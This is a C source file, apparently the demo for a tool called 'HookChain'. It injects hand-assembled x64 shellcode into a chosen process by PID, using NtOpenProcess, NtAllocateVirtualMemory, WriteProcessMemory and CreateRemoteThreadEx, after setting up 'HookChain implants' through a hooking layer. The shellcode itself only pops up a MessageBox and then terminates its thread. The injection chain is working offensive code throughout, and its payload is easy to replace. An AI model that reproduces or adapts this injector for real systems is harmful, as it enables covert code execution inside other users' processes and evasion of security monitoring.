#pragma once

#include <stdio.h>
#include <Windows.h>

#include "hook.h"

INT wmain(int argc, char* argv[])
{
	NTSTATUS status;
	PVOID shellAddress = NULL;
	HANDLE hProcess = (HANDLE)-1;
	DWORD dwPID = 0;
	
	if (argc >= 2)
	{
		dwPID = _wtoi(argv[1]);
		if (dwPID == 0)
			dwPID = atoi(argv[1]);
	}

	if (dwPID == 0) {
		char cPid[7];

		printf("Type the pid: \n");
		fgets(cPid, sizeof(cPid), stdin);
		dwPID = _wtoi(cPid);
		if (dwPID == 0)
			dwPID = atoi(cPid);
	}

	if (dwPID == 0) {
		printf("[!] Failed to get PID\n");
		return 1;
	}

	printf("\n[+] Creating HookChain implants\n");
	if (!InitApi()) {
		printf("[!] Failed to initialize API\n");
		return 1;
	}

	printf("\n[+] HookChain implanted! \\o/\n\n");


    printf("[*] Creating Handle onto PID %d\n", dwPID);

    POBJECT_ATTRIBUTES objectAttributes = (POBJECT_ATTRIBUTES)RtlAllocateHeapStub(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(OBJECT_ATTRIBUTES));
    PCLIENT_ID clientId = (PCLIENT_ID)RtlAllocateHeapStub(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(CLIENT_ID));
    clientId->UniqueProcess = dwPID;
    if (!NT_SUCCESS(NtOpenProcess(&hProcess, PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD, objectAttributes, clientId))) {
        printf("[!] Failed to call OP: Status = 0x%08lx\n", GetLastError());
        return 1;
    }

    printf("[*] Allocating memory at Handle 0x%p\n", hProcess);

    SIZE_T memSize = 0x1000;
    if (!NT_SUCCESS(NtAllocateVirtualMemory(hProcess, &shellAddress, 0, &memSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ))) {
        printf("[!] Failed to call VA(shellAddress): Status = 0x%08lx\n", GetLastError());
        return 1;
    }

    printf("[*] Injecting remote shellcode\n");

    //Write Caption and Text to memory address of remote process
    TCHAR Text[] = TEXT("Message Box created from HookChain");
    TCHAR Caption[] = TEXT("Process injected MessageBox");

    FARPROC fpText = (FARPROC)((PBYTE)shellAddress + 0x100);
    FARPROC fpCaption = (FARPROC)((PBYTE)shellAddress + 0x200);
    PVOID pText = &fpText;
    PVOID pCaption = &fpCaption;

    if (!WriteProcessMemory(hProcess, fpText, (LPCVOID)Text, sizeof(Text), NULL)) {
        printf("[!] Failed to call WPM(Text): Status = 0x%08lx\n", GetLastError());
        return 1;
    }

    if (!WriteProcessMemory(hProcess, fpCaption, (LPCVOID)Caption, sizeof(Caption), NULL)) {
        printf("[!] Failed to call WPM(Caption): Status = 0x%08lx\n", GetLastError());
        return 1;
    }

#ifdef UNICODE
    PVOID pfMessageBox = HGetProcAddress2("User32", "MessageBoxW");
    PVOID pMessageBox = &pfMessageBox;
#else
    FARPROC pfMessageBox = HGetProcAddress2("User32", "MessageBoxA");
    PVOID pMessageBox = &pfMessageBox;
#endif

    PVOID fpTerminateThread = HGetProcAddress2("Kernel32", "TerminateThread");
    PVOID pTerminateThread = &fpTerminateThread;

    /*
    int MessageBox(HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType);

    uType:
        MB_OK = 0x00000000L
        MB_ICONWARNING = 0x00000030L
        MB_TOPMOST = 0x00040000L
        MB_SETFOREGROUND = 0x00010000L

    BOOL TerminateThread(HANDLE hThread, DWORD  dwExitCode);

    */

    unsigned char p1[] = {
        //0xcc,
        0x55																	// push   rbp
        , 0x48, 0x89, 0xe5  													// mov    rbp,rsp

        , 0xfc                                                                  // cld 
        , 0x48, 0x83, 0xe4, 0xf0												// and    rsp, 0xfffffffffffffff0 

        , 0x48, 0x31, 0xc0														// xor    rax,rax
        , 0x48, 0x89, 0xc1														// mov    rcx,rax

        , 0x48, 0xba,*((PBYTE)pText),*((PBYTE)pText + 1),*((PBYTE)pText + 2),*((PBYTE)pText + 3),*((PBYTE)pText + 4),*((PBYTE)pText + 5),*((PBYTE)pText + 6),*((PBYTE)pText + 7)							// mov rdx, ...
        , 0x49, 0xb8,*((PBYTE)pCaption),*((PBYTE)pCaption + 1),*((PBYTE)pCaption + 2),*((PBYTE)pCaption + 3),*((PBYTE)pCaption + 4),*((PBYTE)pCaption + 5),*((PBYTE)pCaption + 6),*((PBYTE)pCaption + 7)	// mov r8, ...
        , 0x41, 0xb9, 0x30, 0x00, 0x05, 0x00									// mov    r9,0x30  => MB_OK | MB_ICONWARNING | MB_TOPMOST | MB_SETFOREGROUND

        , 0x48, 0x83, 0xec, 0x20												// sub    rsp,0x20
        , 0x48, 0x89, 0x04, 0x24												// mov    QWORD PTR [rsp],rax
        , 0x48, 0x89, 0x44, 0x24, 0x08											// mov    QWORD PTR [rsp+0x8],rax
        , 0x48, 0x89, 0x44, 0x24, 0x10											// mov    QWORD PTR [rsp+0x10],rax
        , 0x48, 0x89, 0x44, 0x24, 0x18											// mov    QWORD PTR [rsp+0x18],rax

        , 0x48, 0xb8,*((PBYTE)pMessageBox),*((PBYTE)pMessageBox + 1),*((PBYTE)pMessageBox + 2),*((PBYTE)pMessageBox + 3),*((PBYTE)pMessageBox + 4),*((PBYTE)pMessageBox + 5),*((PBYTE)pMessageBox + 6),*((PBYTE)pMessageBox + 7)	// mov rax ...
        , 0xff, 0xd0															// call   rax

        , 0x48, 0x31, 0xc0														// xor    rax,rax

        , 0x48, 0x89, 0xc1														// mov    rcx,rax
        , 0x48, 0xff, 0xc9														// dec    rcx
        , 0x48, 0x89, 0xc2														// mov    rdx,rax
        , 0x48, 0x83, 0xec, 0x20												// sub    rsp,0x20
        , 0x48, 0x89, 0x04, 0x24												// mov    QWORD PTR [rsp],rax
        , 0x48, 0x89, 0x44, 0x24, 0x08											// mov    QWORD PTR [rsp+0x8],rax
        , 0x48, 0x89, 0x44, 0x24, 0x10											// mov    QWORD PTR [rsp+0x10],rax
        , 0x48, 0x89, 0x44, 0x24, 0x18											// mov    QWORD PTR [rsp+0x18],rax

        , 0x48, 0xb8,*((PBYTE)pTerminateThread),*((PBYTE)pTerminateThread + 1),*((PBYTE)pTerminateThread + 2),*((PBYTE)pTerminateThread + 3),*((PBYTE)pTerminateThread + 4),*((PBYTE)pTerminateThread + 5),*((PBYTE)pTerminateThread + 6),*((PBYTE)pTerminateThread + 7)	// mov rax ...
        , 0xff, 0xd0															// call   rax

        , 0x48, 0x89, 0xec  													// mov    rsp,rbp
        , 0x5d																	// pop    rbp
        , 0xc3																	// ret

        , 0xcc, 0xcc, 0xcc														// INT3
    };

    if (!WriteProcessMemory(hProcess, shellAddress, (LPCVOID)p1, sizeof(p1), NULL)) {
        printf("[!] Failed to call WriteProcessMemory(Shellcode): Status = 0x%08lx\n", GetLastError());
    }

    printf("[*] Calling CreateRemoteThreadEx\n");
    HANDLE hThread = CreateRemoteThreadEx(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)shellAddress, NULL, NULL, NULL, NULL);
    if (hThread == NULL) {
        printf("[!] Failed to call CRT: Status = 0x%08lx\n", GetLastError());
        return 1;
    }

    //Disable Hook prints
    SetDebug(FALSE);

    printf("[+] Shellcode OK!\n");
    printf("\n\n _     _  _____   _____  _     _ _______ _     _ _______ _____ __   _\n |_____| |     | |     | |____/  |       |_____| |_____|   |   | \\  |\n |     | |_____| |_____| |    \\_ |_____  |     | |     | __|__ |  \\_|\n                                                          By M4v3r1ck\n\n");
    return 0x00;

}
